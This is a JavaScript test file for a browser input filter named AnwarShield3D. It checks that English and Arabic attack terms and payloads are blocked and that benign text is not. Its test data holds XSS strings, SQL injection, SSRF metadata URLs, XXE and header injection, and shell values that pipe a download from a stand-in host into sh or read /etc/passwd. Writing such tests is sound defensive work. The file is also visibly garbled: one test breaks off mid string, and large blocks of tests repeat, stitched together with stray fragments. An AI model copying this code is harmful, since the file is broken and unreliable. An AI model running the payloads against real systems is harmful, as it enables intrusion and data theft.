import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';

const source=fs.readFileSync(new URL('../anwar-shield-3d.js',import.meta.url),'utf8');
const document={addEventListener(){},body:{appendChild(){}},getElementById(){return null;},createElement(){return{setAttribute(){},style:{}};}};
const sandbox={document,CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},dispatchEvent(){},decodeURIComponent,setTimeout(){return 1;},clearTimeout(){},WeakMap,Object,String,Array,RegExp};
sandbox.globalThis=sandbox;
vm.runInNewContext(source,sandbox,{filename:'anwar-shield-3d.js'});
const shield=sandbox.AnwarShield3D;

test('version',()=>assert.equal(shield.version,'0.5.0'));
test('blocks isolated attack vocabulary',()=>{
 for(const value of ['XSS','xss','SQL Injection','RCE','CSRF','SSRF','XXE','SSTI','LFI','RFI','Path Traversal','Prototype Pollution','Phishing','Reverse Shell','LDAP Injection','NoSQL Injection','Command Injection']){
  assert.equal(shield.inspect(value).status,'blocked',value);
 }
});
test('blocks executable payload forms but permits benign technology names',()=>{
 for(const value of ['vbscript:alert(1)','eval(alert(1))','document.cookie','innerHTML=payload','outerHTML=payload','onerror=alert(1)','onload=alert(1)']){
  assert.equal(shield.inspect(value).status,'blocked',value);
 }
 for(const value of ['JavaScript','javascript','SQL','HTML','innerHTML','onerror','الحماية','الجلسة']){
  assert.equal(shield.inspect(value).status,'clean',value);
 }
});
test('blocks common XSS and malicious URLs',()=>{
 for(const value of ['<script>alert(1)</script>','<img src=x onerror=alert(1)>','javascript:alert(1)','<svg onload=alert(1)>','https://example.test/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E','https://example.test/%2e%2e/%2e%2e/etc/passwd']){
  assert.equal(shield.inspect(value).status,'blocked',value);
 }
});
test('blocks encoded and obfuscated XSS and traversal variants',()=>{
 for(const value of ['%3Cscript%3Ealert(1)%3C/script%3E','%253Cscript%253Ealert(1)%253C/script%253E','&#x3c;script&#x3e;alert(1)','\\x3cscript\\x3ealert(1)','%252e%252e%252fsecret.txt']){
  assert.equal(shield.inspect(value).status,'blocked',value);
 }
});
test('blocks SSRF local-target URLs',()=>{
 for(const value of ['http://127.0.0.1/admin','http://169.254.169.254/latest/meta-data/','http://192.168.1.10/']){
  assert.equal(shield.inspect(value).status,'blocked',value);
 }
});
test('blocks common SQL injection without blocking ordinary SQL words',()=>{
 for(const value of ["' OR 1=1 --","' OR '1'='1","UNION SELECT password FROM users",'DROP TABLE users','information_schema.tables','SELECT * FROM users WHERE id=1; WAITFOR DELAY']){
  assert.equal(shield.inspect(value).status,'blocked',value);
 }
 assert.equal(shield.inspect('SELECT').status,'clean');
 assert.equal(shield.inspect('I selected a book yesterday.').status,'clean');
});
test('blocks command injection chains and shell execution patterns',()=>{
 for(const value of ['hello; curl https://bad.example','$(bash -c id)','text && powershell -enc AAA','hello; cat /etc/passwd','curl https://bad.example | sh']){
  assert.equal(shield.inspect(value).status,'blocked',value);
 }
});
test('blocks XML, NoSQL, LDAP and header injection',()=>{
 for(const value of ['<!DOCTYPE x SYSTEM "file:///etc/passwd">','{"$ne":null}','{"$gt":""}','*)(&','%0d%0aLocation:%20https://evil.test']){
  assert.equal(shield.inspect(value).status,'blocked',value);
 }
});
test('blocks prototype pollution and reviews template injection',()=>{
 assert.equal(shield.inspect('__proto__.polluted = true').status,'blocked');
 assert.equal(shield.inspect('constructor.prototype.polluted = true').status,'blocked');
 assert.equal(shield.inspect('$'+'{constructor.constructor("return process")()}').status,'review');
});
test('keeps ordinary Arabic creative text and remembrance clean',()=>{
 for(const value of ['السلام عليكم ورحمة الله وبركاته','كتبت اليوم قصيدة عن المطر والحنين.','أستغفر الله العظيم وأتوب إليه','اللهم صل وسلم على نبينا محمد','يا ليل الصب متى غده']){
  assert.equal(shield.inspect(value).status,'clean',value);
 }
});
test('normalizes invisible characters and mixed encodings',()=>{
 assert.equal(shield.inspect('java'+String.fromCharCode(0x200B)+'script:alert(1)').status,'blocked');
 assert.equal(shield.inspect('%252e%252e%252fetc%252fpasswd').status,'blocked');
});


test('blocks Arabic attack intent across spelling, diacritics and separators',()=>{
 for(const value of [
  'تجاوز الحماية',
  'تَجاوُزُ الحِمايَة',
  'تـجـاوز الحماية',
  'تجاوز-الحماية',
  'تخطي نظام الحماية',
  'الالتفاف على الحماية',
  'سرقة الجلسات',
  'اختِطافُ الجلسات',
  'خطف الجلسة',
  'س.ر.ق.ة ا.ل.ج.ل.س.ا.ت',
  'س ر ق ة ا ل ج ل س ا ت',
  'استخراج الرّموز السريّة',
  'سحب التوكنات',
  'سرقة مفاتيح API',
  'تجاوز تسجيل الدخول',
  'تصعيد الامتيازات',
  'تنفيذ أوامر عن بعد',
  'تهريب بيانات المستخدمين',
  'محو سجلات الدخول'
 ]){
  assert.equal(shield.inspect(value).status,'blocked',value);
 }
});
test('blocks spaced, punctuated and homoglyph attack variants',()=>{
 for(const value of ['x.s.s','хѕѕ','s.q.l injection','S Q L Injection','bypass-security','session.hijacking','steal-secrets']){
  assert.equal(shield.inspect(value).status,'blocked',value);
 }
});
test('does not block ordinary Arabic or neutral technical writing',()=>{
 for(const value of [
  'الحماية مهمة لحفظ الملاحظات',
  'الجلسة الأدبية كانت ممتعة',
  'أكتب قصيدة عن المطر والليل',
  'JavaScript لغة تستخدم في تطوير الويب',
  'SQL قاعدة بيانات في درس تعليمي',
  'هذه ملاحظة عن مفاتيح API وكيفية حفظها بأمان'
 ]){
  assert.equal(shield.inspect(value).status,'clean',value);
 }
});
test('review-only patterns remain writable and expose metadata without storing note text',()=>{
 assert.equal(shield.inspect('
 assert.equal(result.blocked,false);
 const handlers={};
 const document={addEventListener(type,callback){handlers[type]=callback;},body:{appendChild(){}},getElementById(){return null;},createElement(){return{style:{},setAttribute(){}};}};
 const sandbox={document,CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},dispatchEvent(){},decodeURIComponent,setTimeout(){return 1;},clearTimeout(){},WeakMap,Object,String,Array,RegExp};
 sandbox.globalThis=sandbox;
 vm.runInNewContext(source,sandbox,{filename:'anwar-shield-review.js'});
 const target={nodeType:1,tagName:'INPUT',type:'text',value:'$'+'{constructor.constructor("return process")()}',disabled:false,readOnly:false};
 const inputEvent={target,defaultPrevented:false,preventDefault(){this.defaultPrevented=true;}};
 handlers.input(inputEvent);
 assert.equal(inputEvent.defaultPrevented,false,'review does not cancel normal typing');
 const records=sandbox.AnwarShield3D.getReviewLog();
 assert.equal(records.length,1);
 assert.equal(records[0].id,'template-injection');
 assert.equal(Object.hasOwn(records[0],'text'),false,'review log contains metadata only');
});

/* Exercise the actual capture-phase event handlers, including contenteditable.
   This catches the regression where the browser warning appeared but the editor
   still retained the text because contenteditable has no .value property. */
test('contenteditable: blocks the final typed character before the attack word appears',()=>{
 const handlers={};
 const doc={
  handlers,
  body:{children:[],appendChild(node){this.children.push(node);}},
  addEventListener(type,callback,capture){assert.equal(capture,true);handlers[type]=callback;},
  getElementById(id){return this.body.children.find(node=>node.id===id)||null;},
  createElement(){return{id:'',style:{},hidden:false,setAttribute(){},textContent:''};}
 };
 const eventSandbox={
  document:doc,
  CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},
  dispatchEvent(){},
  decodeURIComponent,
  setTimeout(){return 1;},
  clearTimeout(){},
  WeakMap,Object,String,Array,RegExp
 };
 eventSandbox.globalThis=eventSandbox;
 vm.runInNewContext(source,eventSandbox,{filename:'anwar-shield-3d-events.js'});

 function makeTextNode(value){
  return{
   nodeType:3,
   textContent:value,
   parentElement:null,
   cloneNode(){return makeTextNode(this.textContent);}
  };
 }
 function makeEditor(value=''){
  const editor={
   nodeType:1,
   tagName:'DIV',
   isContentEditable:true,
   ownerDocument:doc,
   childNodes:[],
   parentElement:null,
   disabled:false,
   readOnly:false,
   getAttribute(name){return name==='contenteditable'?'true':null;},
   contains(node){return node===this||this.childNodes.includes(node);},
   replaceChildren(...nodes){
    this.childNodes=nodes;
    nodes.forEach(node=>{node.parentElement=this;});
   }
  };
  Object.defineProperty(editor,'textContent',{
   get(){return this.childNodes.map(node=>node.textContent||'').join('');},
   set(text){this.replaceChildren(makeTextNode(String(text)));}
  });
  Object.defineProperty(editor,'innerText',{get(){return this.textContent;}});
  editor.textContent=value;
  return editor;
 }
 function event(target,extra={}){
  return Object.assign({
   target,
   defaultPrevented:false,
   stopped:false,
   preventDefault(){this.defaultPrevented=true;},
   stopImmediatePropagation(){this.stopped=true;}
  },extra);
 }

 const editor=makeEditor('');
 handlers.focusin(event(editor));
 for(const character of 'XS'){
  const before=event(editor,{data:character,inputType:'insertText'});
  handlers.beforeinput(before);
  assert.equal(before.defaultPrevented,false,'safe prefix remains typeable');
  editor.textContent=editor.textContent+character;
  handlers.input(event(editor,{inputType:'insertText'}));
 }
 const finalCharacter=event(editor,{data:'S',inputType:'insertText'});
 handlers.beforeinput(finalCharacter);
 assert.equal(finalCharacter.defaultPrevented,true,'the final character completing XSS is cancelled');
 assert.equal(finalCharacter.stopped,true,'the rejected input cannot reach later handlers');
 assert.equal(editor.textContent,'XS','the attack token never appears in the editor');
});

test('contenteditable: rejects malicious paste and drag-drop before insertion',()=>{
 const handlers={};
 const doc={
  body:{children:[],appendChild(node){this.children.push(node);}},
  addEventListener(type,callback,capture){assert.equal(capture,true);handlers[type]=callback;},
  getElementById(id){return this.body.children.find(node=>node.id===id)||null;},
  createElement(){return{id:'',style:{},hidden:false,setAttribute(){},textContent:''};}
 };
 const eventSandbox={document:doc,CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},dispatchEvent(){},decodeURIComponent,setTimeout(){return 1;},clearTimeout(){},WeakMap,Object,String,Array,RegExp};
 eventSandbox.globalThis=eventSandbox;
 vm.runInNewContext(source,eventSandbox,{filename:'anwar-shield-3d-paste.js'});
 const editor={
  nodeType:1,tagName:'DIV',isContentEditable:true,ownerDocument:doc,childNodes:[],parentElement:null,
  getAttribute(name){return name==='contenteditable'?'true':null;},
  contains(node){return node===this||this.childNodes.includes(node);},
  replaceChildren(...nodes){this.childNodes=nodes;nodes.forEach(node=>{node.parentElement=this;});}
 };
 const makeText=value=>({nodeType:3,textContent:value,parentElement:editor,cloneNode(){return makeText(this.textContent);}});
 Object.defineProperty(editor,'textContent',{get(){return this.childNodes.map(node=>node.textContent||'').join('');},set(value){this.replaceChildren(makeText(String(value)));}});
 Object.defineProperty(editor,'innerText',{get(){return this.textContent;}});
 editor.textContent='نص سليم';
 handlers.focusin({target:editor});
 const paste={
  target:editor,defaultPrevented:false,stopped:false,
  clipboardData:{getData(type){return type==='text/plain'?'<script>alert(1)</script>':'';}},
  preventDefault(){this.defaultPrevented=true;},
  stopImmediatePropagation(){this.stopped=true;}
 };
 handlers.paste(paste);
 assert.equal(paste.defaultPrevented,true,'malicious paste is cancelled');
 assert.equal(editor.textContent,'نص سليم','malicious paste does not alter the editor');
 const drop={
  target:editor,defaultPrevented:false,stopped:false,
  dataTransfer:{getData(type){return type==='text/plain'?'../../private.txt':'';}},
  preventDefault(){this.defaultPrevented=true;},
  stopImmediatePropagation(){this.stopped=true;}
 };
 handlers.drop(drop);
 assert.equal(drop.defaultPrevented,true,'malicious drag-drop is cancelled');
 assert.equal(editor.textContent,'نص سليم','malicious drop does not alter the editor');
});

test('contenteditable: restores the last clean DOM snapshot if beforeinput is bypassed',()=>{
 const handlers={};
 const doc={
  body:{children:[],appendChild(node){this.children.push(node);}},
  addEventListener(type,callback,capture){assert.equal(capture,true);handlers[type]=callback;},
  getElementById(id){return this.body.children.find(node=>node.id===id)||null;},
  createElement(){return{id:'',style:{},hidden:false,setAttribute(){},textContent:''};}
 };
 const eventSandbox={document:doc,CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},dispatchEvent(){},decodeURIComponent,setTimeout(){return 1;},clearTimeout(){},WeakMap,Object,String,Array,RegExp};
 eventSandbox.globalThis=eventSandbox;
 vm.runInNewContext(source,eventSandbox,{filename:'anwar-shield-3d-fallback.js'});
 const makeText=value=>({nodeType:3,textContent:value,parentElement:null,cloneNode(){return makeText(this.textContent);}});
 const editor={
  nodeType:1,tagName:'DIV',isContentEditable:true,ownerDocument:doc,childNodes:[],parentElement:null,
  getAttribute(name){return name==='contenteditable'?'true':null;},
  contains(node){return node===this||this.childNodes.includes(node);},
  replaceChildren(...nodes){this.childNodes=nodes;nodes.forEach(node=>{node.parentElement=this;});}
 };
 Object.defineProperty(editor,'textContent',{get(){return this.childNodes.map(node=>node.textContent||'').join('');},set(value){this.replaceChildren(makeText(String(value)));}});
 Object.defineProperty(editor,'innerText',{get(){return this.textContent;}});
 editor.textContent='السطر السليم';
 handlers.focusin({target:editor});
 editor.textContent='<script>alert(1)</script>';
 handlers.input({target:editor,inputType:'insertText'});
 assert.equal(editor.textContent,'السطر السليم','the editor is rolled back to its last clean DOM snapshot');
});
+'{constructor.constructor("return process")()} XSS').status,'blocked','a confirmed attack takes priority over review-only syntax');
 const result=shield.inspect('
 assert.equal(result.blocked,false);
 const handlers={};
 const document={addEventListener(type,callback){handlers[type]=callback;},body:{appendChild(){}},getElementById(){return null;},createElement(){return{style:{},setAttribute(){}};}};
 const sandbox={document,CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},dispatchEvent(){},decodeURIComponent,setTimeout(){return 1;},clearTimeout(){},WeakMap,Object,String,Array,RegExp};
 sandbox.globalThis=sandbox;
 vm.runInNewContext(source,sandbox,{filename:'anwar-shield-review.js'});
 const target={nodeType:1,tagName:'INPUT',type:'text',value:'$'+'{constructor.constructor("return process")()}',disabled:false,readOnly:false};
 const inputEvent={target,defaultPrevented:false,preventDefault(){this.defaultPrevented=true;}};
 handlers.input(inputEvent);
 assert.equal(inputEvent.defaultPrevented,false,'review does not cancel normal typing');
 const records=sandbox.AnwarShield3D.getReviewLog();
 assert.equal(records.length,1);
 assert.equal(records[0].id,'template-injection');
 assert.equal(Object.hasOwn(records[0],'text'),false,'review log contains metadata only');
});

/* Exercise the actual capture-phase event handlers, including contenteditable.
   This catches the regression where the browser warning appeared but the editor
   still retained the text because contenteditable has no .value property. */
test('contenteditable: blocks the final typed character before the attack word appears',()=>{
 const handlers={};
 const doc={
  handlers,
  body:{children:[],appendChild(node){this.children.push(node);}},
  addEventListener(type,callback,capture){assert.equal(capture,true);handlers[type]=callback;},
  getElementById(id){return this.body.children.find(node=>node.id===id)||null;},
  createElement(){return{id:'',style:{},hidden:false,setAttribute(){},textContent:''};}
 };
 const eventSandbox={
  document:doc,
  CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},
  dispatchEvent(){},
  decodeURIComponent,
  setTimeout(){return 1;},
  clearTimeout(){},
  WeakMap,Object,String,Array,RegExp
 };
 eventSandbox.globalThis=eventSandbox;
 vm.runInNewContext(source,eventSandbox,{filename:'anwar-shield-3d-events.js'});

 function makeTextNode(value){
  return{
   nodeType:3,
   textContent:value,
   parentElement:null,
   cloneNode(){return makeTextNode(this.textContent);}
  };
 }
 function makeEditor(value=''){
  const editor={
   nodeType:1,
   tagName:'DIV',
   isContentEditable:true,
   ownerDocument:doc,
   childNodes:[],
   parentElement:null,
   disabled:false,
   readOnly:false,
   getAttribute(name){return name==='contenteditable'?'true':null;},
   contains(node){return node===this||this.childNodes.includes(node);},
   replaceChildren(...nodes){
    this.childNodes=nodes;
    nodes.forEach(node=>{node.parentElement=this;});
   }
  };
  Object.defineProperty(editor,'textContent',{
   get(){return this.childNodes.map(node=>node.textContent||'').join('');},
   set(text){this.replaceChildren(makeTextNode(String(text)));}
  });
  Object.defineProperty(editor,'innerText',{get(){return this.textContent;}});
  editor.textContent=value;
  return editor;
 }
 function event(target,extra={}){
  return Object.assign({
   target,
   defaultPrevented:false,
   stopped:false,
   preventDefault(){this.defaultPrevented=true;},
   stopImmediatePropagation(){this.stopped=true;}
  },extra);
 }

 const editor=makeEditor('');
 handlers.focusin(event(editor));
 for(const character of 'XS'){
  const before=event(editor,{data:character,inputType:'insertText'});
  handlers.beforeinput(before);
  assert.equal(before.defaultPrevented,false,'safe prefix remains typeable');
  editor.textContent=editor.textContent+character;
  handlers.input(event(editor,{inputType:'insertText'}));
 }
 const finalCharacter=event(editor,{data:'S',inputType:'insertText'});
 handlers.beforeinput(finalCharacter);
 assert.equal(finalCharacter.defaultPrevented,true,'the final character completing XSS is cancelled');
 assert.equal(finalCharacter.stopped,true,'the rejected input cannot reach later handlers');
 assert.equal(editor.textContent,'XS','the attack token never appears in the editor');
});

test('contenteditable: rejects malicious paste and drag-drop before insertion',()=>{
 const handlers={};
 const doc={
  body:{children:[],appendChild(node){this.children.push(node);}},
  addEventListener(type,callback,capture){assert.equal(capture,true);handlers[type]=callback;},
  getElementById(id){return this.body.children.find(node=>node.id===id)||null;},
  createElement(){return{id:'',style:{},hidden:false,setAttribute(){},textContent:''};}
 };
 const eventSandbox={document:doc,CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},dispatchEvent(){},decodeURIComponent,setTimeout(){return 1;},clearTimeout(){},WeakMap,Object,String,Array,RegExp};
 eventSandbox.globalThis=eventSandbox;
 vm.runInNewContext(source,eventSandbox,{filename:'anwar-shield-3d-paste.js'});
 const editor={
  nodeType:1,tagName:'DIV',isContentEditable:true,ownerDocument:doc,childNodes:[],parentElement:null,
  getAttribute(name){return name==='contenteditable'?'true':null;},
  contains(node){return node===this||this.childNodes.includes(node);},
  replaceChildren(...nodes){this.childNodes=nodes;nodes.forEach(node=>{node.parentElement=this;});}
 };
 const makeText=value=>({nodeType:3,textContent:value,parentElement:editor,cloneNode(){return makeText(this.textContent);}});
 Object.defineProperty(editor,'textContent',{get(){return this.childNodes.map(node=>node.textContent||'').join('');},set(value){this.replaceChildren(makeText(String(value)));}});
 Object.defineProperty(editor,'innerText',{get(){return this.textContent;}});
 editor.textContent='نص سليم';
 handlers.focusin({target:editor});
 const paste={
  target:editor,defaultPrevented:false,stopped:false,
  clipboardData:{getData(type){return type==='text/plain'?'<script>alert(1)</script>':'';}},
  preventDefault(){this.defaultPrevented=true;},
  stopImmediatePropagation(){this.stopped=true;}
 };
 handlers.paste(paste);
 assert.equal(paste.defaultPrevented,true,'malicious paste is cancelled');
 assert.equal(editor.textContent,'نص سليم','malicious paste does not alter the editor');
 const drop={
  target:editor,defaultPrevented:false,stopped:false,
  dataTransfer:{getData(type){return type==='text/plain'?'../../private.txt':'';}},
  preventDefault(){this.defaultPrevented=true;},
  stopImmediatePropagation(){this.stopped=true;}
 };
 handlers.drop(drop);
 assert.equal(drop.defaultPrevented,true,'malicious drag-drop is cancelled');
 assert.equal(editor.textContent,'نص سليم','malicious drop does not alter the editor');
});

test('contenteditable: restores the last clean DOM snapshot if beforeinput is bypassed',()=>{
 const handlers={};
 const doc={
  body:{children:[],appendChild(node){this.children.push(node);}},
  addEventListener(type,callback,capture){assert.equal(capture,true);handlers[type]=callback;},
  getElementById(id){return this.body.children.find(node=>node.id===id)||null;},
  createElement(){return{id:'',style:{},hidden:false,setAttribute(){},textContent:''};}
 };
 const eventSandbox={document:doc,CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},dispatchEvent(){},decodeURIComponent,setTimeout(){return 1;},clearTimeout(){},WeakMap,Object,String,Array,RegExp};
 eventSandbox.globalThis=eventSandbox;
 vm.runInNewContext(source,eventSandbox,{filename:'anwar-shield-3d-fallback.js'});
 const makeText=value=>({nodeType:3,textContent:value,parentElement:null,cloneNode(){return makeText(this.textContent);}});
 const editor={
  nodeType:1,tagName:'DIV',isContentEditable:true,ownerDocument:doc,childNodes:[],parentElement:null,
  getAttribute(name){return name==='contenteditable'?'true':null;},
  contains(node){return node===this||this.childNodes.includes(node);},
  replaceChildren(...nodes){this.childNodes=nodes;nodes.forEach(node=>{node.parentElement=this;});}
 };
 Object.defineProperty(editor,'textContent',{get(){return this.childNodes.map(node=>node.textContent||'').join('');},set(value){this.replaceChildren(makeText(String(value)));}});
 Object.defineProperty(editor,'innerText',{get(){return this.textContent;}});
 editor.textContent='السطر السليم';
 handlers.focusin({target:editor});
 editor.textContent='<script>alert(1)</script>';
 handlers.input({target:editor,inputType:'insertText'});
 assert.equal(editor.textContent,'السطر السليم','the editor is rolled back to its last clean DOM snapshot');
});
+'{constructor.constructor("return process")()}');
 assert.equal(result.status,'review');
 assert.equal(result.blocked,false);
 const handlers={};
 const document={addEventListener(type,callback){handlers[type]=callback;},body:{appendChild(){}},getElementById(){return null;},createElement(){return{style:{},setAttribute(){}};}};
 const sandbox={document,CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},dispatchEvent(){},decodeURIComponent,setTimeout(){return 1;},clearTimeout(){},WeakMap,Object,String,Array,RegExp};
 sandbox.globalThis=sandbox;
 vm.runInNewContext(source,sandbox,{filename:'anwar-shield-review.js'});
 const target={nodeType:1,tagName:'INPUT',type:'text',value:'$'+'{constructor.constructor("return process")()}',disabled:false,readOnly:false};
 const inputEvent={target,defaultPrevented:false,preventDefault(){this.defaultPrevented=true;}};
 handlers.input(inputEvent);
 assert.equal(inputEvent.defaultPrevented,false,'review does not cancel normal typing');
 const records=sandbox.AnwarShield3D.getReviewLog();
 assert.equal(records.length,1);
 assert.equal(records[0].id,'template-injection');
 assert.equal(Object.hasOwn(records[0],'text'),false,'review log contains metadata only');
});

/* Exercise the actual capture-phase event handlers, including contenteditable.
   This catches the regression where the browser warning appeared but the editor
   still retained the text because contenteditable has no .value property. */
test('contenteditable: blocks the final typed character before the attack word appears',()=>{
 const handlers={};
 const doc={
  handlers,
  body:{children:[],appendChild(node){this.children.push(node);}},
  addEventListener(type,callback,capture){assert.equal(capture,true);handlers[type]=callback;},
  getElementById(id){return this.body.children.find(node=>node.id===id)||null;},
  createElement(){return{id:'',style:{},hidden:false,setAttribute(){},textContent:''};}
 };
 const eventSandbox={
  document:doc,
  CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},
  dispatchEvent(){},
  decodeURIComponent,
  setTimeout(){return 1;},
  clearTimeout(){},
  WeakMap,Object,String,Array,RegExp
 };
 eventSandbox.globalThis=eventSandbox;
 vm.runInNewContext(source,eventSandbox,{filename:'anwar-shield-3d-events.js'});

 function makeTextNode(value){
  return{
   nodeType:3,
   textContent:value,
   parentElement:null,
   cloneNode(){return makeTextNode(this.textContent);}
  };
 }
 function makeEditor(value=''){
  const editor={
   nodeType:1,
   tagName:'DIV',
   isContentEditable:true,
   ownerDocument:doc,
   childNodes:[],
   parentElement:null,
   disabled:false,
   readOnly:false,
   getAttribute(name){return name==='contenteditable'?'true':null;},
   contains(node){return node===this||this.childNodes.includes(node);},
   replaceChildren(...nodes){
    this.childNodes=nodes;
    nodes.forEach(node=>{node.parentElement=this;});
   }
  };
  Object.defineProperty(editor,'textContent',{
   get(){return this.childNodes.map(node=>node.textContent||'').join('');},
   set(text){this.replaceChildren(makeTextNode(String(text)));}
  });
  Object.defineProperty(editor,'innerText',{get(){return this.textContent;}});
  editor.textContent=value;
  return editor;
 }
 function event(target,extra={}){
  return Object.assign({
   target,
   defaultPrevented:false,
   stopped:false,
   preventDefault(){this.defaultPrevented=true;},
   stopImmediatePropagation(){this.stopped=true;}
  },extra);
 }

 const editor=makeEditor('');
 handlers.focusin(event(editor));
 for(const character of 'XS'){
  const before=event(editor,{data:character,inputType:'insertText'});
  handlers.beforeinput(before);
  assert.equal(before.defaultPrevented,false,'safe prefix remains typeable');
  editor.textContent=editor.textContent+character;
  handlers.input(event(editor,{inputType:'insertText'}));
 }
 const finalCharacter=event(editor,{data:'S',inputType:'insertText'});
 handlers.beforeinput(finalCharacter);
 assert.equal(finalCharacter.defaultPrevented,true,'the final character completing XSS is cancelled');
 assert.equal(finalCharacter.stopped,true,'the rejected input cannot reach later handlers');
 assert.equal(editor.textContent,'XS','the attack token never appears in the editor');
});

test('contenteditable: rejects malicious paste and drag-drop before insertion',()=>{
 const handlers={};
 const doc={
  body:{children:[],appendChild(node){this.children.push(node);}},
  addEventListener(type,callback,capture){assert.equal(capture,true);handlers[type]=callback;},
  getElementById(id){return this.body.children.find(node=>node.id===id)||null;},
  createElement(){return{id:'',style:{},hidden:false,setAttribute(){},textContent:''};}
 };
 const eventSandbox={document:doc,CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},dispatchEvent(){},decodeURIComponent,setTimeout(){return 1;},clearTimeout(){},WeakMap,Object,String,Array,RegExp};
 eventSandbox.globalThis=eventSandbox;
 vm.runInNewContext(source,eventSandbox,{filename:'anwar-shield-3d-paste.js'});
 const editor={
  nodeType:1,tagName:'DIV',isContentEditable:true,ownerDocument:doc,childNodes:[],parentElement:null,
  getAttribute(name){return name==='contenteditable'?'true':null;},
  contains(node){return node===this||this.childNodes.includes(node);},
  replaceChildren(...nodes){this.childNodes=nodes;nodes.forEach(node=>{node.parentElement=this;});}
 };
 const makeText=value=>({nodeType:3,textContent:value,parentElement:editor,cloneNode(){return makeText(this.textContent);}});
 Object.defineProperty(editor,'textContent',{get(){return this.childNodes.map(node=>node.textContent||'').join('');},set(value){this.replaceChildren(makeText(String(value)));}});
 Object.defineProperty(editor,'innerText',{get(){return this.textContent;}});
 editor.textContent='نص سليم';
 handlers.focusin({target:editor});
 const paste={
  target:editor,defaultPrevented:false,stopped:false,
  clipboardData:{getData(type){return type==='text/plain'?'<script>alert(1)</script>':'';}},
  preventDefault(){this.defaultPrevented=true;},
  stopImmediatePropagation(){this.stopped=true;}
 };
 handlers.paste(paste);
 assert.equal(paste.defaultPrevented,true,'malicious paste is cancelled');
 assert.equal(editor.textContent,'نص سليم','malicious paste does not alter the editor');
 const drop={
  target:editor,defaultPrevented:false,stopped:false,
  dataTransfer:{getData(type){return type==='text/plain'?'../../private.txt':'';}},
  preventDefault(){this.defaultPrevented=true;},
  stopImmediatePropagation(){this.stopped=true;}
 };
 handlers.drop(drop);
 assert.equal(drop.defaultPrevented,true,'malicious drag-drop is cancelled');
 assert.equal(editor.textContent,'نص سليم','malicious drop does not alter the editor');
});

test('contenteditable: restores the last clean DOM snapshot if beforeinput is bypassed',()=>{
 const handlers={};
 const doc={
  body:{children:[],appendChild(node){this.children.push(node);}},
  addEventListener(type,callback,capture){assert.equal(capture,true);handlers[type]=callback;},
  getElementById(id){return this.body.children.find(node=>node.id===id)||null;},
  createElement(){return{id:'',style:{},hidden:false,setAttribute(){},textContent:''};}
 };
 const eventSandbox={document:doc,CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},dispatchEvent(){},decodeURIComponent,setTimeout(){return 1;},clearTimeout(){},WeakMap,Object,String,Array,RegExp};
 eventSandbox.globalThis=eventSandbox;
 vm.runInNewContext(source,eventSandbox,{filename:'anwar-shield-3d-fallback.js'});
 const makeText=value=>({nodeType:3,textContent:value,parentElement:null,cloneNode(){return makeText(this.textContent);}});
 const editor={
  nodeType:1,tagName:'DIV',isContentEditable:true,ownerDocument:doc,childNodes:[],parentElement:null,
  getAttribute(name){return name==='contenteditable'?'true':null;},
  contains(node){return node===this||this.childNodes.includes(node);},
  replaceChildren(...nodes){this.childNodes=nodes;nodes.forEach(node=>{node.parentElement=this;});}
 };
 Object.defineProperty(editor,'textContent',{get(){return this.childNodes.map(node=>node.textContent||'').join('');},set(value){this.replaceChildren(makeText(String(value)));}});
 Object.defineProperty(editor,'innerText',{get(){return this.textContent;}});
 editor.textContent='السطر السليم';
 handlers.focusin({target:editor});
 editor.textContent='<script>alert(1)</script>';
 handlers.input({target:editor,inputType:'insertText'});
 assert.equal(editor.textContent,'السطر السليم','the editor is rolled back to its last clean DOM snapshot');
});
